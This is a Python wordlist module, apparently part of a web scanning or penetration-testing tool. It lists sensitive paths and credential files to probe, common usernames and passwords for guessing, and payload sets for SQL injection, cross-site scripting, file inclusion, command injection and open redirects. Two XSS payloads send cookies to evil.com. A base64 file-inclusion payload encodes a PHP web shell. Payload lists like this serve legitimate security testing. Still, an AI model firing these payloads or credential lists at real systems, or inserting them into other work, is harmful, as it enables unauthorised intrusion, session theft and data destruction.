from __future__ import annotations

from pathlib import Path


DIRS_COMMON = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "dashboard", "panel", "console", "manage", "manager",
    "api", "api/v1", "api/v2", "api/v3", "graphql",
    ".env", ".git", ".git/config", ".git/HEAD", ".gitignore",
    ".svn", ".svn/entries", ".hg",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
    ".well-known/security.txt",
    "wp-config.php", "wp-config.php.bak", "wp-content", "wp-includes",
    "config.php", "config.yml", "config.json", "config.xml",
    "configuration.php", "settings.php", "settings.py",
    ".htaccess", ".htpasswd", "web.config",
    "server-status", "server-info", "info.php", "phpinfo.php",
    "test.php", "test", "debug", "trace",
    "backup", "backup.zip", "backup.tar.gz", "backup.sql",
    "db.sql", "dump.sql", "database.sql",
    "uploads", "upload", "files", "media", "static", "assets",
    "tmp", "temp", "cache", "logs", "log",
    "cgi-bin", "scripts", "includes", "inc",
    "phpmyadmin", "pma", "adminer", "adminer.php",
    "swagger", "swagger-ui", "swagger.json", "openapi.json",
    "docs", "documentation", "readme", "README.md", "CHANGELOG.md",
    "node_modules", "package.json", "package-lock.json", "composer.json",
    "Gemfile", "Rakefile", "Makefile", "Dockerfile", "docker-compose.yml",
    ".dockerignore",
    "actuator", "actuator/health", "actuator/env", "actuator/beans",
    "health", "healthz", "ready", "readyz", "status",
    "metrics", "prometheus",
    "error", "errors", "404", "500",
    "register", "signup", "forgot", "reset", "logout",
    "profile", "account", "user", "users",
    "search", "download", "export", "import",
    "cron", "jobs", "queue", "workers",
    "socket.io", "ws", "websocket",
    "favicon.ico", "manifest.json", "service-worker.js",
    ".DS_Store", "Thumbs.db", "desktop.ini",
    "elmah.axd", "trace.axd",
    "solr", "jenkins", "nagios", "grafana",
    "kibana", "elasticsearch", "_cat/indices",
    "wp-json", "wp-json/wp/v2/users",
    ".bash_history", ".ssh", "id_rsa", "id_rsa.pub",
    "etc/passwd", "etc/shadow",
    "proc/self/environ", "proc/version",
]

SUBDOMAINS_DEFAULT = [
    "www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "mx",
    "ns1", "ns2", "ns3", "dns", "dns1", "dns2",
    "api", "app", "dev", "staging", "stage", "test", "qa", "uat",
    "beta", "demo", "sandbox", "preview",
    "admin", "panel", "dashboard", "portal", "console", "manage",
    "login", "auth", "sso", "accounts", "id",
    "static", "cdn", "assets", "media", "img", "images", "files",
    "docs", "help", "support", "wiki", "blog", "status",
    "shop", "store", "pay", "billing",
    "git", "gitlab", "ci", "jenkins",
    "monitor", "grafana", "prometheus", "kibana", "logs",
    "db", "mysql", "postgres", "mongo", "redis", "cache",
    "vpn", "proxy", "gateway", "lb",
    "m", "mobile", "v1", "v2", "internal", "secure",
    "old", "legacy", "backup", "tmp",
    "s3", "storage", "archive",
    "mx1", "mx2", "relay",
    "www1", "www2", "web",
]

PASSWORDS_COMMON = [
    "admin", "password", "123456", "12345678", "1234", "qwerty",
    "abc123", "monkey", "master", "dragon", "111111", "baseball",
    "iloveyou", "trustno1", "sunshine", "princess", "football",
    "shadow", "superman", "michael", "ninja", "mustang",
    "access", "letmein", "passw0rd", "pass123", "root", "toor",
    "changeme", "test", "guest", "default", "welcome",
    "P@ssw0rd", "P@ssword1", "Password1", "Password123",
    "admin123", "admin1234", "administrator",
]

USERNAMES_COMMON = [
    "admin", "administrator", "root", "user", "test", "guest",
    "info", "adm", "mysql", "postgres", "oracle", "ftp",
    "pi", "puppet", "ansible", "vagrant", "azureuser",
    "ec2-user", "ubuntu", "centos", "deploy", "ftpuser",
    "www-data", "backup", "operator", "manager", "support",
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "\" OR 1=1--", "1' ORDER BY 1--", "1' UNION SELECT NULL--",
    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
    "' WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--", "1 AND SLEEP(5)",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "'; DROP TABLE users--", "1; SELECT pg_sleep(5)--",
    "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "admin'--", "') OR ('1'='1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "<script>fetch('https://evil.com/'+document.cookie)</script>",
    "<img src=x onerror=fetch('https://evil.com/'+document.cookie)>",
    "{{7*7}}", "${7*7}", "#{7*7}",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../config",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:\\boot.ini",
    "C:\\windows\\win.ini",
]

CMDI_PAYLOADS = [
    "; id", "| id", "|| id", "&& id", "& id",
    "`id`", "$(id)", "; whoami", "| whoami",
    "|| whoami", "&& whoami",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; sleep 5", "| sleep 5", "& sleep 5",
    "|| sleep 5", "&& sleep 5",
    "`sleep 5`", "$(sleep 5)",
    "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
    "%0aid", "%0awhoami",
    "{{7*7}}", "${7*7}",
    "1;sleep${IFS}5", "1|sleep${IFS}5",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "/\\evil.com",
    "https://evil.com%40target.com",
    "https://target.com.evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "http:evil.com",
    "%68%74%74%70%73%3a%2f%2fevil.com",
    "https://evil.com#@target.com",
    "https://evil.com?@target.com",
    "//evil%00.com",
    "//%0d%0aevil.com",
    "https://evil.com/..;/",
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "returnTo", "return_to",
    "next", "next_url", "goto", "go", "to",
    "target", "dest", "destination", "redir",
    "continue", "forward", "out", "view",
    "ref", "referrer", "callback", "cb",
    "path", "rurl", "link",
]


def load_file_wordlist(path: Path) -> list[str]:
    if path.is_file():
        lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
        return [w.strip() for w in lines if w.strip() and not w.startswith("#")]
    return []
